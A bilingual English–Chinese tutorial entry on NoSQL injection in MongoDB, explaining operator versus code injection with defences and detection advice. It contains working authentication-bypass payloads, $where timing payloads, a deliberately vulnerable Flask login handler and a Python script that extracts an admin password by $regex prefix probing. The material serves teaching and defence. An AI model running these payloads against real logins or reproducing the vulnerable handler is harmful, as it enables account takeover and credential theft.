---
id: nosqli-fundamentals
title_en: "NoSQL Injection, Part 1 — Operators, Code and MongoDB"
title_zh: "NoSQL 注入（一）：运算符、代码与 MongoDB"
summary_en: NoSQL is not immune, because injection was never about SQL. It is about data becoming instruction — and in a document database the instruction is an object, so the boundary breaks on type rather than on quotes. This entry covers the two mechanisms, MongoDB authentication bypass and extraction, and why there is no parameterisation to reach for.
summary_zh: NoSQL 并不免疫，因为注入从来不是关于 SQL 的。它是关于"数据变成指令"——而在文档数据库里，指令是一个对象，所以边界是在**类型**上被打破，而不是在引号上。这一篇讲两种本质不同的机制、MongoDB 的认证绕过与数据提取，以及为什么这里没有一个"参数化"可以抓。
tags: [web, nosql-injection, mongodb, authentication-bypass, blind-injection]
tools: [MongoDB, Python, Burp Suite, NoSQLMap, mongosh]
attck: [T1190]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### "NoSQL means no injection" is wrong, and the reason matters

The widespread belief is that document databases are safe because there is no SQL string to inject into. The belief is wrong, and understanding *why* it is wrong is the whole foundation of this entry.

**Injection was never about SQL.** It is about a boundary between **data** and **instruction** being crossed. SQL injection is one instance of that: the instruction is a string, so a quote can end the part the developer wrote and start the part the attacker wrote.

In a document database the instruction is not a string. It is a **structured object**:

```javascript
{ username: "alice", password: "secret" }
```

That looks like it should be safe — there are no quotes to escape. And it *would* be safe, if the application always placed user input in the **value** position of that object. The vulnerability appears when user input can reach the **structure** position instead:

```javascript
{ username: { $ne: null }, password: { $ne: null } }
```

That is not a comparison against a value any more. It is a **different query**: "find a user whose name is not null", which matches the first user in the collection — usually an administrator, because that is who is created first.

So the boundary that gets crossed is not the quote boundary. It is the **type boundary**: a value became an operator. That distinction is not academic, because it determines what the defence is — and as this entry shows, it is not the defence you would reach for from the SQL world.

### Two mechanisms, not one

This is the most useful thing to take from this entry: **NoSQL injection has two mechanically different forms**, and conflating them produces confused payloads and confused fixes.

| | **Operator injection** | **Code injection** |
|---|---|---|
| What the attacker controls | The **structure** of a query object | The **text** of a piece of code |
| How the boundary breaks | A value's type becomes an operator | A quote ends a string literal |
| Example | `{"$ne": null}` in a value position | `$where: "this.name == '" + input + "'"` |
| Requires | That user input be parsed into a data structure | That user input be concatenated into code |
| Defence | **Type and shape validation** | **Do not concatenate; do not use `$where`** |
| Cousin in SQL | — (no equivalent) | **Exactly SQL injection** |

**Operator injection is the novel one.** It has no real counterpart in SQL, because SQL's grammar does not let a *value* become an operator: `WHERE name = $ne` is a syntax error. In a document database, whether an input is a value or an operator depends only on **what the application did with it before passing it in** — and if the application parsed it as JSON, or let PHP turn a form field into an array, then the attacker is choosing the structure.

**Code injection is the familiar one.** MongoDB's `$where` and `mapReduce` execute **JavaScript**. If an application builds that JavaScript by concatenation, the result is SQL injection with a different language:

```javascript
db.users.find({ $where: "this.name == '" + name + "'" })
```

Send `name = ' || '1'=='1` and the predicate becomes always true. Nothing about this is NoSQL-specific — it is the same failure described in part 1 of the SQL series, and it has the same fix.

### The query language, minimally

You cannot reason about operator injection without knowing what the operators are. A MongoDB query is a document, and a field's value is either a literal or an **operator expression**:

```javascript
// equality
{ status: "active" }

// comparison operators
{ age: { $gt: 18 } }
{ age: { $gte: 18, $lte: 65 } }
{ status: { $ne: "banned" } }
{ role: { $in: ["admin", "editor"] } }

// logic
{ $or: [ { role: "admin" }, { vip: true } ] }
{ $and: [ { age: { $gt: 18 } }, { status: "active" } ] }
{ $nor: [ { banned: true } ] }

// pattern matching, which is the extraction workhorse
{ username: { $regex: "^adm" } }

// existence and type
{ email: { $exists: true } }
{ age: { $type: "int" } }

// server-side JavaScript
{ $where: "this.credits > 100" }
{ $where: function() { return this.credits > 100; } }
```

**Every operator in that list is a query feature.** None of them is an attack. The attack is that an application let a user decide **which of them applies** — which is exactly the same statement as "the application let a user contribute syntax".

### Authentication bypass

The classic, and the one worth understanding first because it is a single request.

**Where the shape comes from.** Two common ways an attacker gains control of the structure:

1. **PHP-style array parameters.** In PHP, a form field named `username[]` or `username[x]` arrives as an **array**, not a string. PHP does this by design — it is how multi-value form fields work — and if the code passes that array straight to the database driver, the driver receives a document.

```
POST /login
username[$ne]=x&password[$ne]=x
```

`$_POST['username']` is now `['$ne' => 'x']`, and the query becomes:

```javascript
{ username: { $ne: "x" }, password: { $ne: "x" } }
```

2. **JSON request bodies.** Many APIs accept JSON directly, and if the handler forwards the parsed body into the query without checking types, the attacker simply writes the object:

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

**Why it authenticates.** The query no longer asks "is there a user whose name equals this and whose password equals that". It asks "is there a user whose name is not null", which is **every** user — and `findOne` returns the first one it finds. Insert an administrator first, as every seeding script does, and the first one is the administrator.

**The operators that work for this**, in rough order of usefulness:

| Payload | Query it produces | Effect |
|---|---|---|
| `{"$ne": null}` | name != null | Matches anything with a name |
| `{"$ne": "x"}` | name != "x" | Matches unless the name is literally `x` |
| `{"$gt": ""}` | name > "" | Matches any non-empty string |
| `{"$regex": ".*"}` | name matches `.*` | Matches anything |
| `{"$in": ["admin"]}` | name in the list | Targets a specific account |
| `{"$where": "1==1"}` | arbitrary predicate | Works when `$where` is permitted |

```python
# what the vulnerable server-side code looks like, and why it is vulnerable
from flask import Flask, request, jsonify
import pymongo

app = Flask(__name__)
db = pymongo.MongoClient().appdb

@app.post("/login")
def login():
    creds = request.get_json()                      # attacker-controlled structure
    user = db.users.find_one({
        "username": creds["username"],              # value position, but the value may be an operator
        "password": creds["password"],
    })
    return jsonify(ok=bool(user), user=(user or {}).get("username"))

# the payload that authenticates without knowing any password:
#   {"username": {"$ne": null}, "password": {"$ne": null}}
```

The fix in that snippet is one line — `if not isinstance(creds["username"], str): abort(400)` — and the reason it works is the subject of the next section.

### Extracting data

Authentication bypass proves the injection; extraction is the part that takes work. Two approaches, and the first is far more common.

#### `$regex` as a boolean oracle

`$regex` matches a pattern, so the presence or absence of a successful match is a **yes/no question** about data you cannot see:

```javascript
// does the admin password start with "a"?
{ username: "admin", password: { $regex: "^a" } }
```

If the login succeeds, the first character is `a`. Then ask about `^ab`, `^abc`, and so on. Each confirmed prefix shortens the search for the next character, and the alphabet is whatever you expect the password to contain:

```python
import string, json, urllib.request

TARGET = "http://target/login"

def try_password_prefix(prefix: str) -> bool:
    """True if the admin password starts with this prefix (the vulnerable endpoint's oracle)."""
    body = json.dumps({
        "username": "admin",
        "password": {"$regex": "^" + prefix},
    }).encode()
    req = urllib.request.Request(TARGET, data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read()).get("ok", False)

def extract(alphabet=string.ascii_lowercase + string.digits + "_-", max_len=64) -> str:
    found = ""
    while len(found) < max_len:
        for ch in alphabet:
            if try_password_prefix(found + ch):
                found += ch
                break
        else:
            break                                  # no character matched: end of value
    return found

print("recovered:", extract())
```

That is the entire technique, and it is the direct analogue of the blind extraction in the SQL series — except the oracle is a **regex match** rather than a comparison, which has an important consequence: **it is prefix-based, so each request confirms a growing prefix** rather than asking about a single character. In practice it is one request per character per candidate, which is slower than binary search but far simpler to implement.

Two practical notes: `^` anchors the match, so always start the pattern with it, and **escape** the prefix — if the recovered value contains a regex metacharacter like `.` or `*`, an unescaped pattern will match the wrong thing.

#### `$where` for time and boolean blind

When `$regex` on a value is not available — for instance when there is no comparable field to filter on — `$where` gives you both a boolean and a time oracle, because you are writing JavaScript:

```javascript
// boolean: does the predicate hold?
{ $where: "this.username == 'admin' && this.password.match(/^a/)" }

// time: delay if the predicate holds
{ $where: "if (this.username=='admin' && this.password.match(/^a/)) { sleep(5000) } return true" }
```

`sleep()` is provided by MongoDB's JavaScript environment, so the delay-based technique from the SQL series works here unchanged — measure the baseline, use a threshold, confirm anomalies. The cost is that `$where` **cannot use an index**, so every query is a full collection scan: on a large collection the request may take seconds even without a deliberate sleep, and on a small one it is fast and quiet.

#### Enumerating fields with `$where`

`this` inside `$where` is the current document, so JavaScript object enumeration becomes a way to discover the schema:

```javascript
{ $where: "for (var k in this) { if (k.length > 5) { sleep(1000); break } } return true" }
```

That is the same boolean oracle applied to **field names** rather than values — useful when the application's schema is unknown and the collection has no `information_schema` to read.

### What `$where` can and cannot do

It is worth being precise, because both over- and under-estimating it lead to wrong conclusions.

**What it can do:** evaluate arbitrary JavaScript **within the database's JavaScript sandbox**, access the current document's fields through `this`, call string and regex methods, call `sleep()`, iterate fields, and return a boolean that drives whether the document matches.

**What it generally cannot do:** reach the operating system, read files, or make network connections. MongoDB's `$where` runs in a sandboxed JavaScript context, and the older, more dangerous `db.eval()` — which also ran JavaScript but with more capability — was **removed in MongoDB 4.2**. So the common claim that `$where` injection means remote code execution on the host is, for current versions, not accurate. Treat it as **data disclosure and query manipulation**, not as code execution on the server.

**And what it costs:** `$where` disables index usage, so it is slow, and it is exactly the kind of feature a hardened deployment turns off. MongoDB supports `--noscripting`, which disables server-side JavaScript execution entirely — including `$where` — and any application that does not need it should use it.

### Why there is no "parameterisation" here

This is the part that most confuses people arriving from the SQL series, and it is worth stating plainly.

**MongoDB has no prepared statements.** There is no equivalent of `SELECT ... WHERE name = ?` where the query structure is fixed before the data arrives, because the query *is* a data structure. An application builds a document and hands it to the driver; there is no separate parse step for the driver to have already completed.

That does **not** mean the database is inherently less safe — it means **the defence has to be at a different layer**. Since you cannot fix it by separating channels, you fix it by **constraining the shape of what is allowed through**:

| Defence | How it works |
|---|---|
| **Type checking** | Reject anything that is not the expected type: `if not isinstance(x, str): reject` |
| **Schema validation** | MongoDB's `$jsonSchema` collection validation rejects documents whose types do not match the schema |
| **Never parse user input into a query object** | Do not `json.loads` a parameter and pass it as a filter |
| **Disable `$where`** | `--noscripting`, or simply never build it from user input |
| **Strip `$`-prefixed keys from input objects** | A defence-in-depth measure, not a primary control |

**Type checking is the equivalent of parameterisation here**, and the analogy is closer than it looks: parameterisation works by insisting that the data position contains data; type checking works by insisting that the value position contains a value. Both are about **not letting an input decide what kind of thing it is.**

```python
def string_field(value, name="field") -> str:
    """The one-line defence against operator injection."""
    if not isinstance(value, str):
        raise ValueError(f"{name} must be a string")
    return value

# and for nested structures, validate the shape rather than the contents
def require_flat_strings(doc: dict, allowed: set) -> dict:
    out = {}
    for k, v in doc.items():
        if k not in allowed:
            raise ValueError(f"unexpected field {k}")
        out[k] = string_field(v, k)
    return out
```

Notice that this rejects the `{$ne: null}` payload structurally: an operator expression is a **dict**, and the field expects a **string**. The injection does not need to be detected, because it cannot be represented.

### Detection and mitigation

- **Alert on `$`-prefixed keys arriving in user input.** `$ne`, `$gt`, `$regex`, `$where`, `$in` appearing in a request body, a query string or a JSON payload have no legitimate reason to be there: operators are the application's vocabulary, not the client's. This is the single highest-value signal for operator injection, and it is a cheap string check.
- **Alert on type mismatches, not just values.** A login endpoint receiving an object or an array where it expects a string is either a bug or an attack, and both are worth knowing about. Log the **type** of each field alongside its value, so that `{"password": {"$ne": null}}` is visible as a structural anomaly rather than as an odd password.
- **Watch authentication patterns.** A burst of failed logins from one source with systematically varying usernames is credential stuffing; a burst against **one** account with varying payload structure is `$regex` extraction. The second has a distinctive shape: many requests, one account, and the payloads differ in a way that suggests prefix building.
- **Look at the database side for `$where` and for scans.** `$where` disables indexes, so its presence shows up as collection scans (`COLLSCAN` in `explain()`) and as slow queries, and `sleep()` inside `$where` shows up as requests taking suspiciously round amounts of time. Both are visible in the database's own logs and profiler, and neither requires inspecting the application's traffic.
- **For mitigation, start with types, then schema, then disabling what you do not need.** Reject non-string input for string fields; add `$jsonSchema` validation on the collections that matter; run with `--noscripting` if the application does not use server-side JavaScript; and give the application's database user the least privilege it can work with — a user restricted to one database cannot pivot to the others when an injection succeeds.
- **Do not bother with escaping.** There is no quote to escape in an operator injection, and string sanitisation that targets SQL metacharacters is irrelevant here. Anyone proposing "we filter quotes" as the fix for a NoSQL injection has misdiagnosed which mechanism is in play, and it is worth checking whether they have also misdiagnosed whether it is fixed.
- **And keep the two mechanisms separate when you write the fix up.** Operator injection is fixed by type and shape validation; code injection is fixed by not concatenating and by not using `$where` on user input. A report that says "NoSQL injection" without saying which of the two is present does not tell the developer what to change.

<!-- lang:zh -->
### "NoSQL 就没有注入"是错的，而理由很要紧

流传很广的一种看法是：文档数据库没有 SQL 字符串可以注入，所以是安全的。这个看法是错的，而理解它**为什么**错，就是这一篇的全部基础。

**注入从来就不是关于 SQL 的。** 它是关于**数据**与**指令**之间的边界被跨过。SQL 注入只是它的一个实例：指令是一个字符串，所以一个引号可以结束开发者写的那部分、开始攻击者写的那部分。

在文档数据库里，指令不是字符串，而是**结构化的对象**：

```javascript
{ username: "alice", password: "secret" }
```

这看起来应该很安全 —— 没有引号可以逃逸。而它**确实**会是安全的，只要应用总是把用户输入放在那个对象的**值**位置上。漏洞出现在用户输入能到达**结构**位置的时候：

```javascript
{ username: { $ne: null }, password: { $ne: null } }
```

这不再是一次"与某个值比较"。它是**另一个查询**："找一个名字不为 null 的用户"，而这匹配集合里的第一个用户 —— 通常是管理员，因为管理员总是第一个被创建的。

所以被跨过的边界不是引号边界，而是**类型边界**：一个值变成了一个运算符。这个区别不是学术性的，因为它决定了防御是什么 —— 而这一篇会说明，那不是你从 SQL 世界会顺手抓来的那个防御。

### 两种机制，不是一种

这是这一篇最该带走的东西：**NoSQL 注入有两种机制上完全不同的形态**，把它们混为一谈会产出混乱的 payload 和混乱的修法。

| | **运算符注入** | **代码注入** |
|---|---|---|
| 攻击者控制的是什么 | 查询对象的**结构** | 一段代码的**文本** |
| 边界怎么被打破 | 值的类型变成了运算符 | 引号结束了一个字符串字面量 |
| 例子 | 值位置里的 `{"$ne": null}` | `$where: "this.name == '" + input + "'"` |
| 前提 | 用户输入被解析成了数据结构 | 用户输入被拼接进了代码 |
| 防御 | **类型与形状校验** | **不拼接；不对用户输入用 `$where`** |
| 在 SQL 里的亲戚 | ——（没有对应物） | **和 SQL 注入一模一样** |

**运算符注入是新东西。** 它在 SQL 里没有真正的对应物，因为 SQL 的语法不允许一个**值**变成运算符：`WHERE name = $ne` 是语法错误。而在文档数据库里，一个输入是值还是运算符，完全取决于**应用在把它传进去之前做了什么** —— 如果应用把它当作 JSON 解析了，或者让 PHP 把一个表单字段变成了数组，那么**是攻击者在选择结构**。

**代码注入是熟悉的那一个。** MongoDB 的 `$where` 和 `mapReduce` 执行的是 **JavaScript**。如果应用用拼接构造那段 JavaScript，结果就是换了一种语言的 SQL 注入：

```javascript
db.users.find({ $where: "this.name == '" + name + "'" })
```

发 `name = ' || '1'=='1`，谓词就永远是真。这件事没有任何 NoSQL 特有的地方 —— 它就是 SQL 系列第一篇里描述的那个失败，修法也一样。

### 查询语言，最低限度

不懂运算符是什么，就没法推理运算符注入。一个 MongoDB 查询就是一个文档，而字段的值要么是字面量，要么是一个**运算符表达式**：

```javascript
// 相等
{ status: "active" }

// 比较运算符
{ age: { $gt: 18 } }
{ age: { $gte: 18, $lte: 65 } }
{ status: { $ne: "banned" } }
{ role: { $in: ["admin", "editor"] } }

// 逻辑
{ $or: [ { role: "admin" }, { vip: true } ] }
{ $and: [ { age: { $gt: 18 } }, { status: "active" } ] }
{ $nor: [ { banned: true } ] }

// 模式匹配，这是提取的主力
{ username: { $regex: "^adm" } }

// 存在性与类型
{ email: { $exists: true } }
{ age: { $type: "int" } }

// 服务端 JavaScript
{ $where: "this.credits > 100" }
{ $where: function() { return this.credits > 100; } }
```

**那张表里每一个运算符都是查询功能。** 它们都不是攻击。攻击在于**应用让用户决定了其中哪一个生效** —— 而这和"应用让用户贡献了语法"是同一句话。

### 认证绕过

经典手法，也是该先理解的那个，因为它就是一次请求。

**这个结构是从哪来的。** 攻击者获得结构控制权的两种常见途径：

1. **PHP 风格的数组参数。** 在 PHP 里，一个名为 `username[]` 或 `username[x]` 的表单字段会以**数组**形式到达，而不是字符串。这是 PHP 的设计 —— 多值表单字段就是这么工作的 —— 而如果代码把这个数组直接交给数据库驱动，驱动收到的就是一个文档。

```
POST /login
username[$ne]=x&password[$ne]=x
```

`$_POST['username']` 现在成了 `['$ne' => 'x']`，查询变成：

```javascript
{ username: { $ne: "x" }, password: { $ne: "x" } }
```

2. **JSON 请求体。** 很多 API 直接接受 JSON，而如果处理函数把解析后的请求体不经类型检查就送进查询，攻击者直接写出那个对象就行：

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

**它为什么会认证通过。** 查询不再问"有没有一个用户名等于这个、且口令等于那个的用户"，而是问"有没有一个名字不为 null 的用户"，那就是**每一个**用户 —— 而 `findOne` 返回它找到的第一个。像每个种子脚本那样先把管理员插进去，那第一个就是管理员。

**能用于此的运算符**，大致按好用程度排列：

| Payload | 它产生的查询 | 效果 |
|---|---|---|
| `{"$ne": null}` | name != null | 匹配任何有名字的 |
| `{"$ne": "x"}` | name != "x" | 除非名字字面上就是 `x`，否则匹配 |
| `{"$gt": ""}` | name > "" | 匹配任何非空字符串 |
| `{"$regex": ".*"}` | name 匹配 `.*` | 匹配任何东西 |
| `{"$in": ["admin"]}` | name 在列表里 | 针对某个具体账号 |
| `{"$where": "1==1"}` | 任意谓词 | 在允许 `$where` 时可用 |

```python
# 有漏洞的服务端代码长什么样，以及为什么它有漏洞
from flask import Flask, request, jsonify
import pymongo

app = Flask(__name__)
db = pymongo.MongoClient().appdb

@app.post("/login")
def login():
    creds = request.get_json()                      # 结构由攻击者控制
    user = db.users.find_one({
        "username": creds["username"],              # 值位置，但那个"值"可能是个运算符
        "password": creds["password"],
    })
    return jsonify(ok=bool(user), user=(user or {}).get("username"))

# 在不知道任何口令的情况下完成认证的 payload：
#   {"username": {"$ne": null}, "password": {"$ne": null}}
```

那段代码的修法只有一行 —— `if not isinstance(creds["username"], str): abort(400)` —— 而它之所以有效，就是下一节的主题。

### 提取数据

认证绕过证明了注入存在；提取才是要花功夫的部分。两种办法，第一种常见得多。

#### 把 `$regex` 当布尔预言机

`$regex` 匹配一个模式，于是"匹配成功与否"就成了关于你看不见的数据的**是非题**：

```javascript
// 管理员口令是以 "a" 开头的吗？
{ username: "admin", password: { $regex: "^a" } }
```

如果登录成功，首字符就是 `a`。然后问 `^ab`、`^abc`，如此推进。每确认一个前缀，下一个字符的搜索范围就缩小，而字母表就是你预期口令里会出现的东西：

```python
import string, json, urllib.request

TARGET = "http://target/login"

def try_password_prefix(prefix: str) -> bool:
    """如果管理员口令以该前缀开头则返回 True（有漏洞端点的预言机）。"""
    body = json.dumps({
        "username": "admin",
        "password": {"$regex": "^" + prefix},
    }).encode()
    req = urllib.request.Request(TARGET, data=body,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read()).get("ok", False)

def extract(alphabet=string.ascii_lowercase + string.digits + "_-", max_len=64) -> str:
    found = ""
    while len(found) < max_len:
        for ch in alphabet:
            if try_password_prefix(found + ch):
                found += ch
                break
        else:
            break                                  # 没有字符匹配：值结束了
    return found

print("提取结果:", extract())
```

这就是全部技术，而它是 SQL 系列里盲注提取的直接对应物 —— 只不过预言机是一次**正则匹配**而不是一次比较，这带来一个重要后果：**它是前缀式的，所以每次请求确认的是一个不断变长的前缀**，而不是在问单个字符。实践上它是"每个字符每个候选一次请求"，比二分法慢，但实现起来简单得多。

两个实用提醒：`^` 锚定匹配，所以模式总要以它开头；另外要**转义**前缀 —— 如果提取出的值里含 `.`、`*` 这类正则元字符，未转义的模式会匹配到错的东西。

#### 用 `$where` 做时间与布尔盲注

当没法在某个值上用 `$regex` 时 —— 比如没有一个可比的字段来过滤 —— `$where` 同时给你布尔和时间两种预言机，因为你写的是 JavaScript：

```javascript
// 布尔：谓词成立吗？
{ $where: "this.username == 'admin' && this.password.match(/^a/)" }

// 时间：谓词成立就延迟
{ $where: "if (this.username=='admin' && this.password.match(/^a/)) { sleep(5000) } return true" }
```

`sleep()` 由 MongoDB 的 JavaScript 环境提供，所以 SQL 系列里那套基于延迟的技术在这里原样可用 —— 先测基线、用阈值、对反常做确认。代价是 `$where` **用不了索引**，每一次查询都是全集合扫描：在大的集合上，就算没有刻意 sleep，请求也可能要几秒；在小的集合上则又快又安静。

#### 用 `$where` 枚举字段

`$where` 里的 `this` 是当前文档，于是 JavaScript 的对象枚举就成了发现库结构的手段：

```javascript
{ $where: "for (var k in this) { if (k.length > 5) { sleep(1000); break } } return true" }
```

这就是同一个布尔预言机，只是作用在**字段名**而不是值上 —— 当应用的库结构未知、而集合里又没有 `information_schema` 可读时，这很有用。

### `$where` 能做什么、不能做什么

值得说准确，因为高估和低估都会导致错误结论。

**它能做的**：在**数据库的 JavaScript 沙箱**里求值任意 JavaScript、通过 `this` 访问当前文档的字段、调字符串与正则方法、调 `sleep()`、遍历字段，并返回一个决定该文档是否匹配的布尔值。

**它一般不能做的**：触及操作系统、读文件、发起网络连接。MongoDB 的 `$where` 运行在沙箱化的 JavaScript 上下文里，而那个更危险的旧功能 `db.eval()` —— 它也跑 JavaScript，但权限更大 —— 已在 **MongoDB 4.2 中被移除**。所以"`$where` 注入就等于在主机上远程执行代码"这个常见说法，对当前版本来说并不准确。把它当作**数据泄漏与查询操纵**，而不是服务器上的代码执行。

**以及它的代价**：`$where` 会让索引失效，所以它慢，而它恰恰是加固过的部署会关掉的那类功能。MongoDB 支持 `--noscripting`，它会完全禁用服务端 JavaScript 执行 —— 包括 `$where` —— 任何不需要它的应用都应该用上。

### 为什么这里没有一个"参数化"可以抓

这是从 SQL 系列过来的人最容易被绕住的一点，值得直说。

**MongoDB 没有预编译语句。** 没有 `SELECT ... WHERE name = ?` 那种"查询结构在数据到达之前就固定下来"的等价物，因为**查询本身就是一个数据结构**。应用构造一个文档、交给驱动；不存在一个驱动已经完成的、独立的解析步骤。

这**不**意味着这个数据库天生更不安全 —— 它意味着**防御必须在另一层**。既然你没法靠"分离通道"来修，你就靠**约束允许通过的东西的形状**来修：

| 防御 | 它怎么工作 |
|---|---|
| **类型校验** | 拒绝任何不是预期类型的东西：`if not isinstance(x, str): reject` |
| **schema 校验** | MongoDB 的 `$jsonSchema` 集合校验会拒绝类型不符的文档 |
| **绝不要把手输入解析成查询对象** | 不要 `json.loads` 一个参数然后当过滤器传进去 |
| **禁用 `$where`** | `--noscripting`，或者干脆不要用用户输入构造它 |
| **从输入对象里剥掉 `$` 开头的键** | 一条纵深防御措施，不是主要控制 |

**类型校验在这里就相当于参数化**，而且这个类比比你想象的更贴切：参数化靠的是坚持"数据位置上只能是数据"；类型校验靠的是坚持"值位置上只能是一个值"。两者都是关于**不让一个输入决定自己是什么种类的东西**。

```python
def string_field(value, name="field") -> str:
    """针对运算符注入的那一行防御。"""
    if not isinstance(value, str):
        raise ValueError(f"{name} 必须是字符串")
    return value

# 对嵌套结构，校验它的形状而不是它的内容
def require_flat_strings(doc: dict, allowed: set) -> dict:
    out = {}
    for k, v in doc.items():
        if k not in allowed:
            raise ValueError(f"意外的字段 {k}")
        out[k] = string_field(v, k)
    return out
```

注意它是**从结构上**拒绝 `{$ne: null}` 那个 payload 的：一个运算符表达式是一个 **dict**，而那个字段期待的是一个**字符串**。这个注入不需要被检测出来，因为它根本无法被表示出来。

### 检测与缓解

- **对出现在用户输入里的 `$` 开头键告警。** `$ne`、`$gt`、`$regex`、`$where`、`$in` 出现在请求体、查询串或 JSON 载荷里，没有任何正当理由：运算符是应用的词汇，不是客户端的。这是运算符注入价值最高的单一信号，而且它是一次很便宜的字符串检查。
- **对类型不匹配告警，而不只是对值告警。** 一个登录端点收到本该是字符串的位置上来了对象或数组，那要么是 bug 要么是攻击，两者都值得知道。把每个字段的**类型**和它的值一起记下来，这样 `{"password": {"$ne": null}}` 就会作为一个结构性异常显出来，而不是一个奇怪的口令。
- **盯认证模式。** 单一来源的一串失败登录、用户名系统性地变化，那是撞库；针对**同一个**账号、载荷结构变化的爆发，那是 `$regex` 提取。后者有个很独特的形状：请求很多、账号只有一个、而载荷的差异方式暗示着在拼前缀。
- **在数据库侧盯 `$where` 和扫描。** `$where` 让索引失效，所以它的存在表现为集合扫描（`explain()` 里的 `COLLSCAN`）和慢查询，而 `$where` 里的 `sleep()` 表现为请求耗时可疑地取整。两者在数据库自己的日志和 profiler 里都看得见，都不需要去检查应用的流量。
- **缓解的顺序是：先类型、再 schema、然后关掉不需要的。** 字符串字段拒收非字符串输入；在要紧的集合上加 `$jsonSchema` 校验；如果应用不用服务端 JavaScript 就以 `--noscripting` 运行；并给应用的数据库用户它能工作所需的最小权限 —— 一个被限制在单个库的用户，在注入成功时也无法横向到其他库。
- **不要去搞转义。** 运算符注入里没有引号可以转义，而针对 SQL 元字符的字符串净化在这里毫不相关。谁提出"我们过滤引号"作为 NoSQL 注入的修法，谁就误判了正在起作用的是哪种机制 —— 也值得顺带确认一下，他是不是同时也误判了"已经修好了没有"。
- **写报告时把两种机制分开。** 运算符注入靠类型与形状校验修；代码注入靠不拼接、以及在用户输入上不用 `$where` 修。一份只说"NoSQL 注入"、不说清是这两种里的哪一种的报告，没有告诉开发者该改什么。
